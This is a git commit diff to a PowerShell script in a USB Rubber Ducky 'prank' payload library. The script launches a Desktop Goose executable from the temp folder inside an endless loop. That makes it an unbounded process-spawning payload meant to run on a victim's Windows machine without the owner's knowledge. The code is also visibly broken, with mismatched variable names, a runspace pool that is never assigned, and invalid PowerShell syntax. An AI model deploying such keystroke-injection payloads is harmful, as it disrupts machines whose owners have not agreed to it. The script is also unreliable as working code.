0a611c055f7b89e43d72b2b89f6f2456f5d313a0
FalsePhilosopher <joshgarland90@gmail.com>
2022-08-25 13:37:07 -0600

    updates

--- Ducky/USBRubberducky/library/prank/Win/Desktop_Goose/dgcp.ps1
+++ Ducky/USBRubberducky/library/prank/Win/Desktop_Goose/dgcp.ps1
@@ -1,2 +1,2 @@
 $file="$env:TMP"+'\dg\GooseDesktop.exe'
-while (1) {$NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(Start-Process -FilePath "$file");;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()}
+$NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::("while (1) {Start-Process -FilePath "$file"}");;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()
